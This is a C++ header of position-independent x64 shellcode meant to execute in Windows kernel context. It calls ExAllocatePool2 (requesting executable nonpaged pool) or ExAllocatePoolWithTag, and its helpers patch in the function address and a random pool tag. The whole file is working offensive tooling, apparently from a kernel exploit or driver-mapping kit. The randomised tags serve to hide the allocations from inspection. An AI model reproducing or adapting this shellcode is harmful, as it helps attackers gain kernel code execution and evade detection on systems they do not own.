#pragma once
#include <cstdint>
#include <random>
#include <cstring>

// Pool allocation shellcode - position independent
// Input: RCX = size to allocate, RDX = kernel address to store result
// Output: Stores allocated pointer at [RDX], returns STATUS_SUCCESS

namespace PoolShellcode {

// Shellcode for ExAllocatePool2 (Windows 10 2004+)
// ExAllocatePool2(POOL_FLAGS Flags, SIZE_T NumberOfBytes, ULONG Tag)
// POOL_FLAG_NON_PAGED = 0x40
// POOL_FLAG_NON_PAGED_EXECUTE = 0x40 | 0x02 = 0x42 (for executable memory)
static uint8_t g_AllocPool2Shellcode[] = {
    // Function prologue - must preserve non-volatile registers per x64 ABI
    0x55,                                           // push rbp
    0x48, 0x89, 0xE5,                               // mov rbp, rsp
    0x53,                                           // push rbx
    0x57,                                           // push rdi
    0x56,                                           // push rsi
    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 20h (shadow space)
    
    // Save parameters
    0x48, 0x89, 0xD7,                               // mov rdi, rdx  (output addr)
    0x48, 0x89, 0xCE,                               // mov rsi, rcx  (size)
    
    // Setup ExAllocatePool2 call
    // POOL_FLAG_NON_PAGED_EXECUTE = 0x42 (NonPaged + Execute)
    0x48, 0xC7, 0xC1, 0x42, 0x00, 0x00, 0x00,       // mov rcx, 0x42 (POOL_FLAG_NON_PAGED_EXECUTE)
    0x48, 0x89, 0xF2,                               // mov rdx, rsi  (Size)
    0x41, 0xB8, 0x58, 0x58, 0x58, 0x58,             // mov r8d, 'XXXX' (Tag - patched at offset 29)
    
    // Call ExAllocatePool2 (address patched at runtime at offset 35)
    0x48, 0xB8,                                     // mov rax, imm64
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // <ExAllocatePool2 addr - patched>
    0xFF, 0xD0,                                     // call rax
    
    // Store result to output location
    0x48, 0x89, 0x07,                               // mov [rdi], rax
    
    // Function epilogue
    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 20h
    0x5E,                                           // pop rsi
    0x5F,                                           // pop rdi
    0x5B,                                           // pop rbx
    0x5D,                                           // pop rbp
    0x31, 0xC0,                                     // xor eax, eax (return STATUS_SUCCESS)
    0xC3                                            // ret
};

// Shellcode for ExAllocatePoolWithTag (Legacy Windows)
// ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag)
// NonPagedPool = 0
static uint8_t g_AllocPoolWithTagShellcode[] = {
    // Function prologue
    0x55,                                           // push rbp
    0x48, 0x89, 0xE5,                               // mov rbp, rsp
    0x53,                                           // push rbx
    0x57,                                           // push rdi
    0x56,                                           // push rsi
    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 20h (shadow space)
    
    // Save parameters
    0x48, 0x89, 0xD7,                               // mov rdi, rdx  (output addr)
    0x48, 0x89, 0xCE,                               // mov rsi, rcx  (size)
    
    // Setup ExAllocatePoolWithTag call
    // NonPagedPool = 0
    0x31, 0xC9,                                     // xor ecx, ecx (PoolType = 0 = NonPagedPool)
    0x48, 0x89, 0xF2,                               // mov rdx, rsi  (Size)
    0x41, 0xB8, 0x58, 0x58, 0x58, 0x58,             // mov r8d, 'XXXX' (Tag - patched at offset 24)
    
    // Call ExAllocatePoolWithTag (address patched at runtime at offset 30)
    0x48, 0xB8,                                     // mov rax, imm64
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // <addr - patched>
    0xFF, 0xD0,                                     // call rax
    
    // Store result to output location
    0x48, 0x89, 0x07,                               // mov [rdi], rax
    
    // Function epilogue
    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 20h
    0x5E,                                           // pop rsi
    0x5F,                                           // pop rdi
    0x5B,                                           // pop rbx
    0x5D,                                           // pop rbp
    0x31, 0xC0,                                     // xor eax, eax (return STATUS_SUCCESS)
    0xC3                                            // ret
};

constexpr size_t POOL2_SHELLCODE_SIZE = sizeof(g_AllocPool2Shellcode);
constexpr size_t POOL2_TAG_OFFSET = 29;           // Offset of pool tag in ExAllocatePool2 shellcode
constexpr size_t POOL2_ADDR_OFFSET = 35;          // Offset of function address in ExAllocatePool2 shellcode

constexpr size_t POOLWTAG_SHELLCODE_SIZE = sizeof(g_AllocPoolWithTagShellcode);
constexpr size_t POOLWTAG_TAG_OFFSET = 24;        // Offset of pool tag in ExAllocatePoolWithTag shellcode
constexpr size_t POOLWTAG_ADDR_OFFSET = 30;       // Offset of function address in ExAllocatePoolWithTag shellcode

// Maximum shellcode size (for buffer allocation)
constexpr size_t SHELLCODE_SIZE = (POOL2_SHELLCODE_SIZE > POOLWTAG_SHELLCODE_SIZE) ? 
                                   POOL2_SHELLCODE_SIZE : POOLWTAG_SHELLCODE_SIZE;

// Generate random pool tag
inline uint32_t GenerateRandomTag() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint32_t> dis(0x41414141, 0x5A5A5A5A); // A-Z range
    return dis(gen);
}

// Get a copy of shellcode with patches applied
// isPool2 = true for ExAllocatePool2, false for ExAllocatePoolWithTag
inline size_t GetPatchedShellcode(uint8_t* outBuffer, void* funcAddr, bool isPool2) {
    uint32_t tag = GenerateRandomTag();
    
    if (isPool2) {
        memcpy(outBuffer, g_AllocPool2Shellcode, POOL2_SHELLCODE_SIZE);
        *(uint32_t*)(outBuffer + POOL2_TAG_OFFSET) = tag;
        *(uint64_t*)(outBuffer + POOL2_ADDR_OFFSET) = (uint64_t)funcAddr;
        return POOL2_SHELLCODE_SIZE;
    } else {
        memcpy(outBuffer, g_AllocPoolWithTagShellcode, POOLWTAG_SHELLCODE_SIZE);
        *(uint32_t*)(outBuffer + POOLWTAG_TAG_OFFSET) = tag;
        *(uint64_t*)(outBuffer + POOLWTAG_ADDR_OFFSET) = (uint64_t)funcAddr;
        return POOLWTAG_SHELLCODE_SIZE;
    }
}

} // namespace PoolShellcode
